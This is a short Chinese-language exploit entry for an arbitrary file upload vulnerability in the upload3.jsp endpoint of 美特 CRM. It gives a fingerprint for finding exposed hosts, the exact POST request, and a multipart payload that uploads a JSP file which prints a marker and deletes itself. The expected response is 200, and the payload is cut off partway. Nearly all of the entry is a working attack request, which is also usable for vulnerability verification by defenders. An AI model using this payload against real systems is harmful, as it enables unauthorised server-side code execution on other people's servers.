# 美特CRMupload3.jsp存在任意文件上传漏洞

- **系统**：美特　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundaryc4e5992e4…`　`Priority: u=0, i`　`Content-Length: 1062`

**请求体 / payload**
```
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="file"; filename="6erskb.jsp"
Content-Type: application/octet-stream
<% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="key"
file
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="form"
formdata
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name=…（脚本共 1024 字，完整版见原文）
```
- **预期**：200　|　—